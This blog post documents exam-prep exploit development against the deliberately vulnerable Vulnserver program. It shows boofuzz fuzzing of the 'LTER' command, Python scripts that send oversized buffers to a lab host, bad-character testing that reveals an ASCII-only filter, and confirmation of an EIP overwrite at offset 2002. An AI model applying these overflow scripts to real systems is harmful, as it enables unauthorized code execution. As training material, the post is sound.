---
layout: single
title: CTP/OSCE Prep -- 'LTER' SEH Failure, EIP Overwrite Success 
date: 2019-5-29
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will be approaching an overflow in the `LTER` parameter trying to utilize all the tricks we've learned thus far. 

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Goals

For this post, our goal is to try to utilize all the skills we've gained thus far to exploit Vulnserver in a new way, finding a new vulnerable parameter.

## Fuzzing

I tried to go sequentially through the parameters and find one I could fuzz which would make the application crash but none of the first few parameters would actually crash the server. I then picked some at random and struck out there as well. After this excercise, I'm going to have to go back and check people's walkthroughs and see if there is a problem with my Fuzzing methodology and I'm missing vulnerable params. Finally, I fuzzed `LTER` and got the server to crash.

The final `boofuzz` script I used looked like this:
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("LTER")	#just giving our session a name, "LTER"

    	s_string("LTER", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "LTER" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now
 
        session.connect(s_get("LTER"))		#having our 'session' variable connect following the guidelines we established in "LTER"
    	session.fuzz()				#calling this function actually performs the fuzzing

if __name__ == "__main__":
    main()
```

## The Crash!

![](/assets/images/CTP/LTERcrash.JPG)

The first things I noted in Immunity when the server crashed:
+ We are being prompted by Immunity to pass an exception to the program,
+ We have overwritten ECX and EBP, 
+ The stack shows us that `01B4F1F0` and `01B4F1F4` hold `"LTER /.../BBBB..."`

Where do we go from here? Well, we know that having control of the registers is great; however, since we're going to have to pass an exception to this program, and we don't have control of EIP, these registers will be `XOR` against themselves and zeroed out. So the registers are dead to us. 

We definitely want to use the feedback we got from the stack readout where we saw `"LTER /.../BBBB..."`, we will hardcode this into our exploit script. 

The next step we want to do is track down exactly how many bytes `boofuzz` sent and since we know we filled the registers with `B` values, it shouldn't be too hard to track down the exact payload the fuzzer sent. 

## Replicating the Crash

Examining the CLI output from `boofuzz`,

![](/assets/images/CTP/LTERboo.JPG)

We find that in our third payload we sent 5012 bytes and they were all `B` values prepended by `LTER /.../`. So let's hardcode this into our `exploit.py` and see if we can get the program to crash without the fuzzer. This is our exploit script at this point:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = "A" * 5012

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And we get it to crash, awesome

![](/assets/images/CTP/LTERreplicate.JPG)

Let's look at the SEH chain!

![](/assets/images/CTP/SEHLTER.JPG)

Awesome, we've managed to overwrite both of the SEH components, we can probably control the execution now. But, before we get carried away, we have two outstanding tasks:
1. Determine bad chars,
2. Calculate the offset to the SEH components (remember, they are separated by 4 bytes). 

## Determining Bad Characters

Let's cram the badchars variable into our `A` buffer since, judging by the stack output we get from Immunity, that space is huge. Our exploit code at this point will look like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = badchars
buffer += "A" * (5012 - len(badchars))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Once we send this and the application crashes, we have to select one of the overwritten registers, I used EBP, and then right-click > follow in dump. We see that every thing was going really well until right after `7F` where we were expecting to see `80` but instead see a `01`. 

![](/assets/images/CTP/LTERBad80.JPG)

A good habit we should start enforcing is adding some helpful comments to our python code as we progress so that we can start to eliminate some careless mistakes. Let's start:
+ annotating bad chars,
+ annotating shellcode lengths,
+ annotating the payload or `msfvenom` command used to generate the shellcode, and
+ annotating egghunter lengths (if needed).

Let's eliminate `80` from our badchars variable since it's trash and it's trying to ruin our day and our exploit and our chance at OSCE glory. Our exploit now looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = badchars
buffer += "A" * (5012 - len(badchars))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Let's send this and see what happens. 

![](/assets/images/CTP/LTERWTF.JPG)

*Record Scratch*

Err, what? I've never seen this before. It looks like whatever is coming after `7F` is still getting corrupted somehow. 

Using the calculator in Windows on 'Programmer' mode, we can subtract `7F` from `80` and we get 1. If you look back, we were getting `01` as the byte following `7F`. Now that we've removed `80` and the next byte is `81` and we get a `02`, we can obviously assume that everything after `7F` is getting `7F` subtracted from it. I have no idea what this means. 

Let's just Google "00 through 7F" and see what we get. The [first result](https://www.eso.org/~ndelmott/ascii.html) shows us that the hex range of 00 - 7F is the hex range for ASCII characters. So this application is filtering for ASCII characters only! Hopefully there is a way we can make this work with ASCII only. 

## So What Happened Was...

So I never actually got the SEH overwrite to work. I used a 'Net Jump' like we used in our last post and was able to jump right into the first bytes of our `C` (or `D` depending on how you do your script) buffer and was fine. But had limited space to work with. Previously we had jumped back by decrementing a register a few times and then jumping to that register **OR** using an egghunter. But due to the character restrictions, I didn't feel comfortable with our shellcode working.

I tried to find a way to encode the shellcode with the `msfvenom` alphanumeric (ASCII) encoders, but as you will see in this post we would need to know the absolute location of our shellcode as it relates to a register and I couldn't figure out how to do it. We will hopefully revisit the SEH overwrite at some point later in this series and get it working. 

## Lesson Learned

One thing I learned while going through this process, which took hours, was that we don't necessarily have to take what the fuzzer is giving us. Sometimes if you get an SEH overwrite with the fuzzer, if you decrease the size of your fuzzing string you can turn the overflow into a simple EIP overwrite! I wish I would've known this before, but now I will never forget. 

At least we already know the character restrictions and the alphanumeric encoding research I did while working with the SEH overwrite will come in handy soon. For now, let's lower our fuzzing string to 3000 bytes and try this again.

## A New Crash

Reducing our script payload down to 3000 gives us the following exploit code: 
```python
#!/usr/bin/python

import socket
import os
import sys

#poppopret: 6250172B

host = "192.168.1.201"
port = 9999

buffer = "A" * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

If we use this on Vulnserver, we get the following output from Immunity:

![](/assets/images/CTP/LTERtake2.JPG)

This looks promising. We have overwritten EIP. Time to use mona to get a pattern created so we can determine the offset. After
+ using `!mona pc 3000` to create a `pattern.txt` file,
+ making that ASCII string our payload,
+ taking the overwritten EIP value and feeding it to mona with `!mona po <EIP after overflowing with mona pattern>`

We get an offset of 2002. Let's confirm we have our offsets correct. 
```python
#!/usr/bin/python

import socket
import os
import sys

#poppopret: 6250172B

host = "192.168.1.201"
port = 9999

buffer = "A" * 2002
buffer += "BBBB"
buffer += "C" * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

![](/assets/images/CTP/LTERyepagain.JPG)






## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 
